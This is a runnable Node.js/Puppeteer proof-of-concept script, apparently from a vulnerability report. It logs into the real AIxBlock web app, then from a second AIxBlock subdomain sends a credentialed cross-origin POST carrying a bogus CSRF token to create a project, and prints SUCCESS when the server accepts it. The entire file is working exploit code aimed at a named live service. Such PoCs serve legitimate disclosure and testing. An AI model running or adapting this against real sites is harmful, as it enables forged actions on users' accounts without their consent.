/*
 Headless Browser CSRF PoC for AIxBlock
 - Logs into https://app.aixblock.io using provided credentials
 - Navigates to https://workflow-live.aixblock.io/general-editor/
 - From that origin, performs a cross-origin fetch to https://app.aixblock.io/api/projects/
 - Expects a project to be created without valid CSRF token (server-side CSRF missing)

 Usage:
   AIXBLOCK_EMAIL=you@example.com AIXBLOCK_PASSWORD=yourpass node fixes/pocs/csrf-browser-poc.js
*/

const puppeteer = require('puppeteer');

async function waitForAnySelector(page, selectors, options = {}) {
  for (const selector of selectors) {
    try {
      await page.waitForSelector(selector, options);
      return selector;
    } catch (_) {
      // try next
    }
  }
  throw new Error(`None of the selectors appeared: ${selectors.join(', ')}`);
}

async function main() {
  const email = process.env.AIXBLOCK_EMAIL;
  const password = process.env.AIXBLOCK_PASSWORD;
  if (!email || !password) {
    throw new Error('Set AIXBLOCK_EMAIL and AIXBLOCK_PASSWORD environment variables');
  }

  const browser = await puppeteer.launch({ headless: 'new', args: ['--no-sandbox'] });
  const page = await browser.newPage();
  page.setDefaultTimeout(30000);

  // 1) Open login page
  const loginUrls = [
    'https://app.aixblock.io/accounts/login/',
    'https://app.aixblock.io/login',
  ];
  let loggedIn = false;
  for (const url of loginUrls) {
    try {
      await page.goto(url, { waitUntil: 'domcontentloaded' });
      // Common field names across Django/Allauth/custom forms
      const emailSelectors = [
        'input[name=email]',
        'input[type=email]',
        'input[name=username]',
        'input[name=login]'
      ];
      const passwordSelectors = [
        'input[name=password]',
        'input[type=password]'
      ];
      const submitSelectors = [
        'button[type=submit]',
        'input[type=submit]',
        'button.btn-primary',
        'button:has-text("Sign in")',
      ];

      const emailSel = await waitForAnySelector(page, emailSelectors, { timeout: 8000 });
      const passSel = await waitForAnySelector(page, passwordSelectors, { timeout: 8000 });

      await page.focus(emailSel);
      await page.keyboard.type(email, { delay: 10 });
      await page.focus(passSel);
      await page.keyboard.type(password, { delay: 10 });

      // Try clicking submit
      try {
        const submitSel = await waitForAnySelector(page, submitSelectors, { timeout: 4000 });
        await page.click(submitSel);
      } catch (_) {
        // Fallback: press Enter
        await page.keyboard.press('Enter');
      }

      // Wait for navigation or auth indicator
      await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 }).catch(() => {});

      // Heuristic: check we have a session cookie
      const cookies = await page.cookies('https://app.aixblock.io');
      const hasSession = cookies.some(c => c.name.toLowerCase() === 'sessionid');
      if (hasSession) {
        loggedIn = true;
        break;
      }
    } catch (e) {
      // try next login URL
    }
  }

  if (!loggedIn) {
    await browser.close();
    throw new Error('Login failed: could not obtain session cookie');
  }

  // 2) Open workflow-live origin
  const workflowUrl = 'https://workflow-live.aixblock.io/general-editor/';
  await page.goto(workflowUrl, { waitUntil: 'domcontentloaded' });

  // 3) Execute cross-origin fetch from within page context with credentials included
  const result = await page.evaluate(async () => {
    try {
      const res = await fetch('https://app.aixblock.io/api/projects/', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json', 'X-CSRFToken': 'invalid' },
        body: JSON.stringify({ title: 'CSRF_BROWSER_POC', description: 'via workflow-live' })
      });
      const text = await res.text();
      return { status: res.status, body: text };
    } catch (err) {
      return { error: String(err) };
    }
  });

  // 4) Print outcome
  if (result && result.status && String(result.status).startsWith('2')) {
    console.log('SUCCESS: Created project via browser CSRF from workflow-live → app.aixblock.io');
    console.log(result.body);
  } else {
    console.error('FAILURE or BLOCKED:', result);
  }

  await browser.close();
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});


